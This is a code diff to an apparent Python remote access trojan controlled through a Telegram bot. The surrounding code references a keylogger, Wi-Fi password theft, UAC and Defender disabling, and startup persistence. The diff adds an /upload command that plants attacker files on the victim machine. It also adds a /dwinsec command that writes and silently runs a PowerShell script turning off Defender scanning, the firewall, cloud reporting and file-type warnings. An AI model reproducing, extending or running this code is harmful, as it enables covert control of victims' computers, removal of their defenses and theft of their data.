@@ -221,7 +221,8 @@ def send_help(message):
         "/wifipass - Shows all wifi passwords for all saved wifi networks\n"
         "/dtaskmgr - Disables task manager\n"
         "/drun - Disables run command\n"
-        "/dregistry - Disables registry tools"
+        "/dregistry - Disables registry tools\n"
+        "/dwinsec - Disables Windows security protections"
     )
     bot.send_message(message.chat.id, help_message)
 
@@ -242,6 +243,41 @@ def send_photo(message):
             requests.post(url, params=payload, files=files)
         except Exception as e:
             log_message(f"Error in send_photo: {e}", 'error')
+
+# Prompts user to send file
+@bot.message_handler(commands=['upload'])
+def upload_command(message):
+    bot.send_message(message.chat.id, "Please send a file to upload (Max 2GB).")
+    bot.register_next_step_handler(message, handle_document)
+
+# Handles file uploads
+def handle_document(message):
+    if message.content_type == 'document':
+        file_size = message.document.file_size
+        file_limit = 2 * 1024 * 1024 * 1024
+
+        if file_size > file_limit:
+            bot.reply_to(message, "File is too large to upload. Maximum allowed size is 2GB.")
+            return
+
+        try:
+            file_id = message.document.file_id
+            file_info = bot.get_file(file_id)
+
+            downloaded_file = bot.download_file(file_info.file_path)
+            file_name = message.document.file_name
+            save_path = os.path.join(current_directory, file_name)
+
+            with open(save_path, 'wb') as new_file:
+                new_file.write(downloaded_file)
+
+            bot.reply_to(message, f"File '{file_name}' uploaded successfully to {current_directory}!")
+
+        except Exception as e:
+            bot.reply_to(message, f"An error occurred during upload: {e}")
+
+    else:
+        bot.reply_to(message, "Please send a valid document file.")
 
 # Handle file download request and send file to Telegram Bot
 @bot.message_handler(commands=['download'])
@@ -908,6 +944,73 @@ def handle_disable_registry_tools(message):
 
     winreg.CloseKey(reg_key)
 
+# Disable Windows Security Core Protections
+@bot.message_handler(commands=['dwinsec'])
+def handle_disable_windows_security(message):
+    error_log_path = os.path.join(os.getenv('TEMP'), 'disable_windows_security_errors.log')
+
+    powershell_script = f"""
+    $error.Clear()  # Clear any previous errors
+    $errorLog = '{error_log_path}'
+    try {{
+        Add-MpPreference -ExclusionExtension '*' 2>>$errorLog;
+        Set-MpPreference -EnableControlledFolderAccess Disabled 2>>$errorLog;
+        Set-MpPreference -PUAProtection disable 2>>$errorLog;
+        Set-MpPreference -HighThreatDefaultAction 6 -Force 2>>$errorLog;
+        Set-MpPreference -ModerateThreatDefaultAction 6 -Force 2>>$errorLog;
+        Set-MpPreference -LowThreatDefaultAction 6 -Force 2>>$errorLog;
+        Set-MpPreference -SevereThreatDefaultAction 6 -Force 2>>$errorLog;
+        Set-MpPreference -ScanScheduleDay 8 2>>$errorLog;
+        netsh advfirewall set allprofiles state off;
+        Set-MpPreference -MAPSReporting 0 2>>$errorLog;
+        Set-MpPreference -SubmitSamplesConsent 2 2>>$errorLog;
+        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations' -Name 'LowRiskFileTypes' -Value '.vbs;.js;.exe;.bat;.cmd;.msi;.reg;.ps1;' 2>>$errorLog;
+        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\1' -Name '1806' -Value '0' 2>>$errorLog;
+        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\2' -Name '1806' -Value '0' 2>>$errorLog;
+        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3' -Name '1806' -Value '0' 2>>$errorLog;
+        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\4' -Name '1806' -Value '0' 2>>$errorLog;
+    }} catch {{
+        Write-Host "An error occurred: $($_.Exception.Message)"
+    }} finally {{
+        if ($error.Count -gt 0) {{
+            $error | Out-File -FilePath $errorLog -Append
+            exit 1
+        }}
+    }}
+    """
+
+    script_path = os.path.join(os.getenv('TEMP'), 'disable_windows_security.ps1')
+    try:
+        with open(script_path, 'w') as script_file:
+            script_file.write(powershell_script)
+        
+        result = subprocess.run(
+            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", script_path],
+            shell=True,
+            stderr=subprocess.PIPE,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        error_output = result.stderr.decode('utf-8')
+
+        if result.returncode == 0:
+            bot.send_message(message.chat.id, "Windows security settings have been disabled.")
+        else:
+            if os.path.exists(error_log_path):
+                with open(error_log_path, 'r') as f:
+                    error_content = f.read()
+                bot.send_message(message.chat.id, f"Errors occurred:\n{error_content}")
+            else:
+                bot.send_message(message.chat.id, f"An error occurred: {error_output}")
+    
+    except subprocess.CalledProcessError as e:
+        bot.send_message(message.chat.id, f"An error occurred: {e}")
+    
+    finally:
+        if os.path.exists(script_path):
+            os.remove(script_path)
+        if os.path.exists(error_log_path):
+            os.remove(error_log_path)
+
 # Continuation of Keylogger Functions
 # Get path to Driver directory
 def get_app_dir():
@@ -1173,31 +1276,6 @@ def manage_smartscreen():
     except subprocess.CalledProcessError as e:
         print(f"An error occurred: {e}")
 
-# Disable Windows Security Core Protections
-def configure_windows_security():
-    commands = [
-        "powershell.exe -command \"Add-MpPreference -ExclusionExtension '*'\"",
-        "powershell.exe -command \"Set-MpPreference -EnableControlledFolderAccess Disabled\"",
-        "powershell.exe -command \"Set-MpPreference -PUAProtection disable\"",
-        "powershell.exe -command \"Set-MpPreference -HighThreatDefaultAction 6 -Force\"",
-        "powershell.exe -command \"Set-MpPreference -ModerateThreatDefaultAction 6 -Force\"",
-        "powershell.exe -command \"Set-MpPreference -LowThreatDefaultAction 6 -Force\"",
-        "powershell.exe -command \"Set-MpPreference -SevereThreatDefaultAction 6 -Force\"",
-        "powershell.exe -command \"Set-MpPreference -ScanScheduleDay 8\"",
-        "powershell.exe -command \"netsh advfirewall set allprofiles state off\"",
-        "powershell.exe -command \"Set-MpPreference -MAPSReporting 0\"",
-        "powershell.exe -command \"Set-MpPreference -SubmitSamplesConsent 2\"",
-        "powershell.exe -command \"& {Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations' -Name 'LowRiskFileTypes' -Value '.vbs;.js;.exe;.bat;.cmd;.msi;.reg;.ps1;'; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\1' -Name '1806' -Value '0'; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\2' -Name '1806' -Value '0'; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3' -Name '1806' -Value '0'; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\4' -Name '1806' -Value '0';}\""
-    ]
-
-    for command in commands:
-        try:
-            subprocess.run(command, shell=True, check=True)
-            print(f"Successfully executed: {command}")
-        except subprocess.CalledProcessError as e:
-            print(f"An error occurred while executing: {command}")
-            print(f"Error: {e}")
-
 # Check if a scheduled task exists
 def task_exists(task_name):
     try:
@@ -1238,13 +1316,11 @@ if __name__ == '__main__':
             while not run_as_admin():
                 time.sleep(0.1)
 
-        time.sleep(2)
         disable_uac()
         disable_uac_prompt()
         disable_defender_realtime_protection()
         manage_windows_defender()
         manage_smartscreen()
-        configure_windows_security()
         suppress_windows_defender_notifications()
         add_to_startup()
 
